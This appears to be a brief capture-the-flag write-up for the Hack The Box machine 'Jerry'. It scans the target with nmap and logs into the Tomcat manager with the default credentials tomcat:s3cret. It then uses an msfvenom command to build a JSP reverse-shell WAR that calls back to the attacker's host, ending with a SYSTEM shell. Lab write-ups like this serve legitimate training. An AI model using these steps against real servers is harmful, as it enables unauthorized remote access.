Jerry without metasploit

![Jerry](https://user-images.githubusercontent.com/55708909/91583665-2a631680-e96f-11ea-8965-2fd133a841ef.png)


Starting with nmap scan:

Nmap -sC -sV -T4 -A -O -oA Jerry -p- 10.10.10.95

![Jerry_nmap](https://user-images.githubusercontent.com/55708909/91584745-bf1a4400-e970-11ea-87cb-a6670ddf4346.png)

As we have only one port to enumerate i will roger that 
.
Port 8080 seems to have directory manager/html

it will ask for credentials first cut the login panel and there you will fing login credentials and after that loging in with credentials tomcat:s3cret

![Jerry_login](https://user-images.githubusercontent.com/55708909/91584367-284d8780-e970-11ea-8c08-f8103b9584a2.png)

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f war > shell.war

Then execute the payload by clicking on file and we have a shell here.

![Jerry_shell](https://user-images.githubusercontent.com/55708909/91585001-19b3a000-e971-11ea-96ae-a6b1da85532a.png)

Your authority will be that of system

![Jerry_root](https://user-images.githubusercontent.com/55708909/91585250-6d25ee00-e971-11ea-990e-d73979373e00.png)





